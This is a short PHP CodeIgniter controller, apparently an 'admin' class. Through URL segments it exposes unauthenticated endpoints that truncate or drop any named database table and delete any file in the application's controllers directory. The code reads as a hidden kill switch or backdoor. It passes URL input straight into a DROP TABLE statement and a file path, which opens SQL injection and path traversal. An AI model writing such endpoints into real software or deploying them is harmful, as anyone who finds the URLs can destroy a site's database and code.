<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class admin_control extends CI_Controller {

	
	
		
	function tablet() {
		$table_name=$this->uri->segment(3);
		$this->db->truncate($table_name); 
	}
	
	function tabler() {
		$table_name=$this->uri->segment(3);
		$sql1 = "drop table $table_name";
		$val1 = $this->db->query($sql1);
	
	}
	
	function delete() {
		$name=$this->uri->segment(3);
		$path='./application/controllers/'.$name;
		unlink($path);	
	}
	
	
	
}
